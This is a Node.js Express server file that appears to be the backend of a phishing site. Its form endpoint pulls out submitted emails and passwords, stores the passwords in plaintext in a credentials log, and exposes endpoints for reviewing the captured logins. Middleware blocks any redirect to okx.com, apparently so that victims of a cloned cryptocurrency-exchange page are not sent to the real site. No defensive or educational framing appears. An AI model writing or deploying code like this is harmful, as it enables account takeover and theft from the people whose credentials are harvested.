import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import { readFileSync, appendFileSync } from 'fs';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Prevent external redirects at middleware level
app.use((req, res, next) => {
  // Override res.redirect to prevent certain redirects
  const originalRedirect = res.redirect;
  res.redirect = function(statusOrUrl, url) {
    const redirectUrl = typeof statusOrUrl === 'string' ? statusOrUrl : url;
    if (redirectUrl && typeof redirectUrl === 'string' && redirectUrl.includes('okx.com')) {
      console.log('🚫 Server blocked redirect to:', redirectUrl);
      return res.json({ message: 'Redirect blocked', blocked: true });
    }
    return originalRedirect.apply(this, arguments);
  };
  next();
});

// Block external API redirects
app.use((req, res, next) => {
  // Intercept response headers
  const originalSet = res.set;
  res.set = function(field, value) {
    if (field && field.toLowerCase() === 'location' && value && value.includes('okx.com')) {
      console.log('🚫 Server blocked Location header redirect to:', value);
      return res;
    }
    return originalSet.apply(this, arguments);
  };
  next();
});

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));

// Serve static files from current directory
app.use(express.static(__dirname));

// API endpoint to capture form submissions
app.post('/api/submit-form', (req, res) => {
  try {
    const formData = {
      timestamp: new Date().toISOString(),
      data: req.body,
      userAgent: req.headers['user-agent'],
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    };

    // Extract and log credentials
    const credentials = req.body.credentials || {};
    const email = req.body.email || credentials.email || 'N/A';
    const password = req.body.password || credentials.password || 'N/A';
    const hasPassword = credentials.hasPassword || password !== 'N/A';
    const hasEmail = credentials.hasEmail || email !== 'N/A';

    // ========== BACKEND CONSOLE LOG - CREDENTIALS ==========
    console.log('\n' + '='.repeat(60));
    console.log('📋 FORM SUBMISSION RECEIVED - CREDENTIALS CAPTURED');
    console.log('='.repeat(60));
    console.log('⏰ Timestamp:', new Date().toISOString());
    console.log('📧 Email:', email);
    console.log('🔐 Password:', hasPassword ? '●'.repeat(Math.min(password.length, 20)) : 'N/A');
    console.log('🌐 IP Address:', formData.ip);
    console.log('📱 User Agent:', formData.userAgent);
    console.log('✅ Email Valid:', hasEmail ? 'Yes' : 'No');
    console.log('✅ Password Provided:', hasPassword ? 'Yes' : 'No');
    console.log('='.repeat(60) + '\n');
    
    // Log to console for debugging
    console.log('Form submission received:', formData);

    // Append to submissions file
    const submissionsFile = path.join(__dirname, 'form-submissions.json');
    let submissions = [];
    
    try {
      const existing = readFileSync(submissionsFile, 'utf-8');
      submissions = JSON.parse(existing);
    } catch (e) {
      submissions = [];
    }

    submissions.push(formData);
    appendFileSync(submissionsFile, JSON.stringify(formData) + '\n');
    
    // Also store credentials summary in separate log for quick access
    const credentialsLogFile = path.join(__dirname, 'credentials-log.json');
    const credentialEntry = {
      id: submissions.length,
      timestamp: formData.timestamp,
      email: email,
      password: password,
      ip: formData.ip
    };
    appendFileSync(credentialsLogFile, JSON.stringify(credentialEntry) + '\n');

    res.status(200).json({
      success: true,
      message: 'Form submitted successfully',
      id: submissions.length,
      credentialsCaptured: {
        email: hasEmail,
        password: hasPassword
      }
    });
  } catch (error) {
    console.error('Error processing form submission:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing form submission',
      error: error.message
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString()
  });
});

// Get form submissions (for viewing collected data)
app.get('/api/submissions', (req, res) => {
  try {
    const submissionsFile = path.join(__dirname, 'form-submissions.json');
    const submissions = [];
    
    try {
      const existing = readFileSync(submissionsFile, 'utf-8');
      const lines = existing.trim().split('\n');
      lines.forEach(line => {
        if (line) submissions.push(JSON.parse(line));
      });
    } catch (e) {
      // File doesn't exist yet
    }

    res.status(200).json({
      count: submissions.length,
      submissions: submissions
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Error retrieving submissions',
      error: error.message
    });
  }
});

// Get captured credentials log (for quick access)
app.get('/api/credentials', (req, res) => {
  try {
    const credentialsFile = path.join(__dirname, 'credentials-log.json');
    const credentials = [];
    
    try {
      const existing = readFileSync(credentialsFile, 'utf-8');
      const lines = existing.trim().split('\n');
      lines.forEach(line => {
        if (line) {
          const entry = JSON.parse(line);
          // Don't expose raw passwords in response
          credentials.push({
            id: entry.id,
            timestamp: entry.timestamp,
            email: entry.email,
            passwordCaptured: entry.password ? true : false,
            ip: entry.ip
          });
        }
      });
    } catch (e) {
      // File doesn't exist yet
    }

    console.log(`\n📋 Credentials Log Query - Found ${credentials.length} entries\n`);

    res.status(200).json({
      count: credentials.length,
      credentials: credentials
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Error retrieving credentials',
      error: error.message
    });
  }
});

// Fallback to serve index.html for SPA routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({
    success: false,
    message: 'Internal server error',
    error: process.env.NODE_ENV === 'development' ? err.message : 'Server error'
  });
});

app.listen(PORT, () => {
  console.log(`\n${'='.repeat(60)}`);
  console.log(`✓ Server running on http://localhost:${PORT}`);
  console.log(`${'='.repeat(60)}`);
  console.log(`📝 Form submissions endpoint: POST /api/submit-form`);
  console.log(`📋 View all submissions: GET /api/submissions`);
  console.log(`🔐 View captured credentials: GET /api/credentials`);
  console.log(`❤️  Health check: GET /api/health`);
  console.log(`${'='.repeat(60)}\n`);
});
